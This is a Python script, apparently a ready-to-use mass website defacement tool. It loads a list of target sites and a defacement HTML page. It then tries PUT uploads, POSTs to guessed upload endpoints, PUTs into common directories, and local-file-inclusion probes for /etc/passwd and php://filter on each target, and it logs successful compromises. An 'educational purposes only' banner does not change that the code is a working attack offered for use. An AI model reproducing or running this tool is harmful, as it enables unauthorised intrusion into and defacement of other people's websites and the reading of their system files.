import requests
import os
import sys
import time
from urllib.parse import urljoin

class DefaceTool:
    def __init__(self, target_file="targets.txt", payload_file="deface.html"):
        self.targets = self.load_targets(target_file)
        self.payload = self.load_payload(payload_file)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.successful = []
        
    def load_targets(self, filename):
        if not os.path.isfile(filename):
            print(f"Target file {filename} not found!")
            sys.exit(1)
        with open(filename, 'r') as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    
    def load_payload(self, filename):
        if not os.path.isfile(filename):
            print(f"Payload file {filename} not found!")
            sys.exit(1)
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    
    def try_put_method(self, url):
        """Try PUT method for file upload"""
        try:
            response = self.session.put(url, data=self.payload, timeout=10)
            if response.status_code in [200, 201, 204]:
                # Verify the upload
                verify_response = self.session.get(url, timeout=8)
                if verify_response.status_code == 200 and self.payload in verify_response.text:
                    return True, "PUT (verified)"
                return True, "PUT (unverified)"
        except:
            pass
        return False, ""
    
    def try_post_method(self, url):
        """Try POST method for file upload"""
        try:
            # Try various common upload paths
            upload_paths = [
                '/upload.php', '/admin/upload.php', '/wp-admin/upload.php',
                '/upload', '/fileupload', '/admin/fileupload.php',
                '/inc/upload.php', '/includes/upload.php', '/assets/upload.php'
            ]
            
            for path in upload_paths:
                upload_url = urljoin(url, path)
                try:
                    response = self.session.get(upload_url, timeout=5)
                    if response.status_code == 200 and ('upload' in response.text.lower() or 'file' in response.text.lower()):
                        # Try to upload
                        files = {'file': ('index.html', self.payload, 'text/html')}
                        response = self.session.post(upload_url, files=files, timeout=10)
                        if response.status_code in [200, 201]:
                            # Check if upload was successful by accessing the file
                            check_url = urljoin(url, '/uploads/index.html')
                            check_response = self.session.get(check_url, timeout=8)
                            if check_response.status_code == 200 and self.payload in check_response.text:
                                return True, f"POST to {path} (verified)"
                            return True, f"POST to {path} (unverified)"
                except:
                    continue
        except:
            pass
        return False, ""
    
    def try_common_upload_paths(self, url):
        """Try uploading to common vulnerable paths"""
        common_paths = [
            '/uploads/', '/images/', '/assets/', '/files/', '/media/',
            '/upload/', '/img/', '/pictures/', '/data/', '/tmp/',
            '/inc/', '/includes/', '/resources/', '/static/'
        ]
        
        for path in common_paths:
            try:
                upload_url = urljoin(url, path + 'test.html')
                response = self.session.put(upload_url, data=self.payload, timeout=8)
                if response.status_code in [200, 201, 204]:
                    # Verify the upload
                    verify_url = urljoin(url, path + 'test.html')
                    verify_response = self.session.get(verify_url, timeout=8)
                    if verify_response.status_code == 200 and self.payload in verify_response.text:
                        return True, f"PUT to {path} (verified)"
                    return True, f"PUT to {path} (unverified)"
            except:
                continue
        
        return False, ""
    
    def try_lfi_rfi(self, url):
        """Try LFI/RFI vulnerabilities"""
        # This is just for demonstration - actual implementation would be more complex
        lfi_payloads = [
            '/etc/passwd', '../../../../etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            '....//....//....//....//etc/passwd'
        ]
        
        for payload in lfi_payloads:
            try:
                test_url = f"{url}?page={payload}" if '?' in url else f"{url}?page={payload}"
                response = self.session.get(test_url, timeout=8)
                if response.status_code == 200 and ('root:' in response.text or 'php' in response.text.lower()):
                    return True, f"LFI detected with {payload}"
            except:
                continue
        
        return False, ""
    
    def try_direct_file_upload(self, url):
        """Try direct file upload to common locations"""
        upload_locations = [
            '/upload.php', '/admin/upload.php', '/wp-content/upload.php',
            '/filemanager/upload.php', '/assets/upload.php'
        ]
        
        for location in upload_locations:
            try:
                upload_url = urljoin(url, location)
                # Check if upload page exists
                response = self.session.get(upload_url, timeout=8)
                if response.status_code == 200:
                    # Try to upload file
                    files = {'file': ('index.html', self.payload, 'text/html')}
                    response = self.session.post(upload_url, files=files, timeout=10)
                    if response.status_code in [200, 201]:
                        return True, f"Direct upload to {location}"
            except:
                continue
        
        return False, ""
    
    def attack_target(self, target):
        """Try multiple attack methods on a single target"""
        methods = [
            self.try_put_method,
            self.try_common_upload_paths,
            self.try_post_method,
            self.try_direct_file_upload,
            self.try_lfi_rfi
        ]
        
        for method in methods:
            success, technique = method(target)
            if success:
                return True, technique
        
        return False, "No method worked"
    
    def run_attack(self):
        """Run attack on all targets"""
        print(f"[+] Starting attack on {len(self.targets)} targets")
        print("[+] Using payload: deface.html")
        print("-" * 60)
        
        for i, target in enumerate(self.targets, 1):
            print(f"[{i}/{len(self.targets)}] Testing: {target}")
            
            # Ensure target has http/https
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            success, technique = self.attack_target(target)
            
            if success:
                print(f"    [+] SUCCESS: {technique}")
                self.successful.append((target, technique))
            else:
                print("    [-] FAILED: All methods failed")
            
            time.sleep(1)  # Avoid rate limiting
        
        # Print summary
        print("\n" + "=" * 60)
        print(f"ATTACK SUMMARY:")
        print(f"Successful: {len(self.successful)}/{len(self.targets)}")
        print("=" * 60)
        
        for target, technique in self.successful:
            print(f"{target} - {technique}")
        
        # Save results
        with open("successful_attacks.txt", "w") as f:
            for target, technique in self.successful:
                f.write(f"{target} - {technique}\n")
        
        print(f"\nResults saved to: successful_attacks.txt")

# Main execution
if __name__ == "__main__":
    # Banner
    print("""
    ██████╗ ███████╗███████╗ █████╗  ██████╗███████╗
    ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
    ██║  ██║█████╗  █████╗  ███████║██║     █████╗  
    ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  
    ██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
    ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
          
          Website Security Testing Tool
          For Educational Purposes Only
    """)
    
    # Check if files exist
    if not os.path.isfile("targets.txt"):
        print("[!] Please create 'targets.txt' file with target websites")
        sys.exit(1)
        
    if not os.path.isfile("deface.html"):
        print("[!] Please create 'deface.html' file with your deface content")
        sys.exit(1)
    
    # Run the tool
    tool = DefaceTool()
    tool.run_attack()